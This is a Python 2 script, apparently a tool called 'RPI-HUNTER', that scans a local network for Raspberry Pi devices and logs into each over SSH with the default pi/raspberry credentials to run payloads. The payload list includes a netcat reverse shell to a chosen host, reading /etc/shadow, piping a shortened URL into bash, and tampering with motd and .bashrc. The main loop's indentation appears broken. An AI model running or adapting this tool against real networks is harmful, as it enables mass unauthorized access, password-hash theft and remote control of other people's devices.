#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
import os
import argparse
from termcolor import colored, cprint

main_color='yellow'
sub_color='blue'
line_color='red'

parser = argparse.ArgumentParser()
parser.add_argument('--list', action='store_true',
		help='list available payloads')
parser.add_argument('--no-scan', dest='no_scan', action='store_true',
		help='disable arp scanning')
parser.add_argument('-r', dest='ip_range', type=str, default='--localnet',
		help='ip range to scan')
parser.add_argument('-f', dest='ip_list', type=str, default='./scan/rpi_list',
		help='ip list to use (default ./scan/rpi_list)')

parser.add_argument('-u', dest='uname', type=str, default='pi',
		help='username to use when ssh\'ing')
parser.add_argument('-c', dest='creds', type=str, default='raspberry',
		help='password to use when ssh\'ing')

parser.add_argument('--payload', type=str, default='whoami',
		help='(name of, or raw) payload [ex. reverse_shell or \'whoami\']')

parser.add_argument('-H', dest='host', type=str,
		help='(if using reverse_shell payload) host for reverse shell')
parser.add_argument('-P', dest='port', type=str,
		help='(if using reverse_shell payload) port for reverse shell')

parser.add_argument('--safe', action='store_true',
		help='print sshpass command, but don\'t execute it')
parser.add_argument('-q', dest='quiet', action='store_true',
		help='don\'t print banner or arp scan output')
args = parser.parse_args()

#payload= 'echo "raspberry" | sudo -s whoami'

payloads={
'reverse_shell':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '+str(args.host)+' '+str(args.port)+' >/tmp/fc',
'apt_update':'sudo apt update && sudo apt -y upgrade',
'raincow_install':'sudo apt -y install fortune cowsay lolcat',
'gitpip':'sudo apt -y install git python-pip',
'shadow':'sudo cat /etc/shadow',
'motd':'echo "change your password" > /etc/motd',
'raincow_bashrc':'sudo echo "fortune | cowsay | lolcat" >> ~/.bashrc',
'rickroll':'curl -s -l http://bit.ly/10ha8ic | bash'
}

if args.payload in payloads:
	payload=payloads[args.payload]
else:
	payload=args.payload

global quiet
if args.quiet:
	quiet=' &>/dev/null'
else:
	quiet=''

def list():
	l=0
	cprint("payloads:", "green")
	print colored("specify with --payload", "green"), colored("name\n", "yellow")
	for key,value in payloads.items():
		print colored('['+key+']', 'yellow'), colored(value, 'white')
	print('\n')


def scan():
	if not args.no_scan and not args.safe:
		os.system('sudo arp-scan -g '+args.ip_range+' -w ./scan/scan.pcap'+quiet)
		os.system('tshark -r ./scan/scan.pcap > ./scan/pcap.txt 2>/dev/null')
		os.system('cat ./scan/pcap.txt | grep -i "rasp" > ./scan/raspi_list')
		os.system('awk \'{print $8}\' ./scan/raspi_list > ./scan/rpi_list')
		os.system('rm -rf ./scan/scan.pcap && rm -rf ./scan/pcap.txt && rm -rf ./scan/raspi_list')
		cprint('\nlocated '+ str(sum(1 for line in open ('./scan/rpi_list'))) + ' raspi\'s', 'yellow')

def rpi():
	cprint('\nloaded '+ str(sum(1 for line in open (args.ip_list))) + ' ip\'s\n\n', 'yellow')

	list = args.ip_list
	with open(list) as inf:
			lines = [line.strip() for line in inf]
	i=0
	cprint("sending payload to pi\'s", "yellow")
	cprint("godspeed, little payloads\n", "green")

	while i < len(lines):
		print colored("sending payload to ", "yellow"), colored(lines[i], "yellow")
	if args.safe:
		print("sshpass -p \""+args.creds+"\" ssh -o stricthostkeychecking=no "+args.uname+"@"+lines[i]+" "+payload)
	else:
		os.system("sshpass -p \""+args.creds+"\" ssh -o stricthostkeychecking=no "+args.uname+"@"+lines[i]+" "+payload)
		print("\n")
	i+=1
	exit()

def art():
		print('\n')
		cprint("██████╗ ██████╗ ██╗      ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ ", main_color)
		cprint("██╔══██╗██╔══██╗██║      ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗", main_color)
		cprint("██████╔╝██████╔╝██║█████╗███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝", main_color)
		cprint("██╔══██╗██╔═══╝ ██║╚════╝██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗", main_color)
		cprint("██║  ██║██║     ██║      ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║", main_color)
		cprint("╚═╝  ╚═╝╚═╝     ╚═╝      ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝", main_color)
		cprint("-----------------------------------------------------------------------------", line_color)
		cprint("      BusesCanFly                                           76 32 2e 30      ", sub_color)
		cprint("-----------------------------------------------------------------------------", line_color)
		print('\n')


if not args.quiet:
	art()

if args.list:
	list()
else:
	scan()
	rpi()
